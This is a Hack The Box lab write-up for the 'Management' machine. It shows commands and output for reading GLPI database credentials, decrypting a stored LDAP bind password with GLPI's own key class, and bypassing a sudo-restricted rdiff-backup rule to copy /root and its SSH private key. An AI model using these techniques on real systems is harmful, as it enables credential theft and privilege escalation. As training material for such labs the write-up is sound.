# Hack The Box: Management Writeup

## Introduction
This writeup covers the path to compromise the **Management** machine on Hack The Box. The process involves identifying database credentials within a local configuration, extracting and decrypting LDAP bind credentials from the database, pivoting to another user, and finally escalating privileges to root by exploiting a sudo misconfiguration related to `rdiff-backup`.

## Reconnaissance
During the initial reconnaissance and enumeration phases, the following screenshots were captured detailing the web application and related endpoints:

![Reconnaissance 1](Pasted image 20260915223912.png)
![Reconnaissance 2](Pasted image 20260915224019.png)
![Reconnaissance 3](Pasted image 20260915224130.png)
![Reconnaissance 4](Pasted image 20260915230247.png)

*Note: The images above depict the initial web attack surface leading to initial access.*

## Foothold & Lateral Movement

Upon gaining initial access as the `openam` user on the `management` machine, we find the GLPI IT Service Management application installed in `/opt/glpi`.

### Extracting Database Credentials
We investigate the configuration files for GLPI and find hardcoded database credentials in `config_db.php`:

```bash
openam@management:/opt/glpi$ cat config/config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

### Enumerating the MariaDB Database
Using the extracted credentials (`glpi`:`8rhu0L6Pw4Y7`), we connect to the local MariaDB database to hunt for further information. First, we enumerate the users and their password hashes:

```bash
openam@management:/opt/glpi$ mysql -u glpi -p glpidb
Enter password: 8rhu0L6Pw4Y7
```

```sql
MariaDB [glpidb]> select name,password from glpi_users;
+-------------+--------------------------------------------------------------+
| name        | password                                                     |
+-------------+--------------------------------------------------------------+
| glpi        | $2y$10$XbpKpVeQdlzK9Z6ld0aDUulxAS5s6Y.Lc/CtHldOVIlAKNqP7BY1G |
| post-only   | $2y$10$2.DfnJoLnGf4ZiFGMLHYiuVDMwMHKlvwbRvlXE6ZAxwzevQBqNOI2 |
| tech        | $2y$10$qXRfoBja9A82RlrJLZuTB.NNVbTyRsjId4xMnthAwUCX/fNnuXoLe |
| normal      | $2y$10$vsU3M49DpDxr4rHFLzyU0.0mjYMqg1EtK4vY7e8E759SgDWAX208K |
| glpi-system |                                                              |
+-------------+--------------------------------------------------------------+
```

Further enumeration of the database tables reveals the `glpi_authldaps` table. We inspect its contents and uncover an encrypted password for an LDAP service account.

```sql
MariaDB [glpidb]> select * from glpi_authldaps;
```

Key fields retrieved from the query:
| Field | Value |
| --- | --- |
| **id** | 1 |
| **name** | Management Directory |
| **host** | sso.management.htb |
| **basedn** | dc=management,dc=htb |
| **rootdn** | `cn=svc-glpi,ou=services,dc=management,dc=htb` |
| **comment** | Primary directory bind used to synchronise managed client accounts. |
| **rootdn_passwd** | `avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==` |

### Decrypting the LDAP Password
Since the GLPI application itself must decrypt this password to authenticate against the LDAP server, the application's source code contains the necessary decryption logic and key material. We can craft a simple PHP script (`key_decrypt.php`) utilizing the built-in `GLPIKey` class to decrypt the `rootdn_passwd`:

```php
#key_decrypt.php
<?php
define("GLPI_CONFIG_DIR", "/opt/glpi/config");
require "/opt/glpi/vendor/autoload.php";
require "/opt/glpi/src/GLPIKey.php";

$glpikey = new GLPIKey();
$enc     = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==";
$pass    = $glpikey->decrypt($enc);

echo "\n";
echo "[+] GLPI LDAP bind password decrypted\n";
echo "    passwd  : $pass\n";
echo "\n";
```

Executing the script successfully reveals the plaintext password:

```bash
openam@management:~$ php key_decrypt.php

[+] GLPI LDAP bind password decrypted
    passwd  : WpczC40GhTbk
```

This credential (`WpczC40GhTbk`) can then be used to pivot to the `owen` user.

## Privilege Escalation

After successfully pivoting to the user `owen`, we begin our local enumeration. Running `linpeas.sh` reveals several scripts and configuration files, but our primary interest focuses on sudo privileges and binaries that might be abused.

### Exploiting `rdiff-backup`
Enumeration reveals that the `owen` user is allowed to run `rdiff-backup` as `root` via `sudo`. The allowed command forces restricted paths: `sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s`.

However, `rdiff-backup` has a known vulnerability/feature when used with the `--remote-schema` argument, allowing a user to inject command-line arguments and bypass intended restrictions. By manipulating the remote schema, we can force the sudo command to backup arbitrary directories on the filesystem. 

We abuse this to back up the `/root` directory into a temporary folder `/tmp/rootbak` that we control:

```bash
owen@management:~$ rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' backup /::/root /tmp/rootbak && cat /tmp/rootbak/root.txt
```

This command successfully mirrors the `/root` directory locally as `owen`:

```bash
owen@management:~$ ls /tmp/rootbak -la
total 44
drwx------  7 owen owen 4096 Sep 16 13:23 .
drwxrwxrwt 18 root root 4096 Sep 16 14:57 ..
lrwxrwxrwx  1 owen owen    9 Sep 16 14:57 .bash_history -> /dev/null
-rw-r--r--  1 owen owen 3106 Apr 22  2024 .bashrc
drwx------  3 owen owen 4096 Sep  7 11:41 .cache
drwx------  3 owen owen 4096 Sep  7 11:41 .config
drwxr-xr-x  3 owen owen 4096 Sep  7 11:41 .local
-rw-r--r--  1 owen owen  161 Apr 22  2024 .profile
drwx------  3 owen owen 4096 Sep 16 14:57 rdiff-backup-data
-rw-r-----  1 owen owen   33 Sep 16 13:23 root.txt
drwx------  2 owen owen 4096 Sep  7 11:41 .ssh
-rw-r--r--  1 owen owen  177 Sep  7 11:06 .wget-hsts
```

From this cloned directory, we have full read access to the `root.txt` flag and the root user's SSH private key (`id_ed25519`):

```bash
owen@management:~$ cat /tmp/rootbak/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDRqEzX3B6ZIUdm8fp0Ty7FcR+ym8y2Ta/ZopPqEgjznAAAAJiKHFMDihxT
AwAAAAtzc2gtZWQyNTUxOQAAACDRqEzX3B6ZIUdm8fp0Ty7FcR+ym8y2Ta/ZopPqEgjznA
AAAEC1DT/FX4yt0JieQdIfLJ2389KJYZz1bHsGBjGcb/B/7dGoTNfcHpkhR2bx+nRPLsVx
H7KbzLZNr9mik+oSCPOcAAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

We can now use this SSH key to fully compromise the system as `root`.

## Conclusion
The path to root on the Management machine required solid enumeration of local configuration files and the database. After successfully decrypting LDAP credentials using the application's built-in libraries, we gained lateral access to the user `owen`. Finally, analyzing the sudo privileges allowed us to bypass the restricted mode of `rdiff-backup`, enabling arbitrary read access to the `/root` directory, providing the root flag and private SSH key.
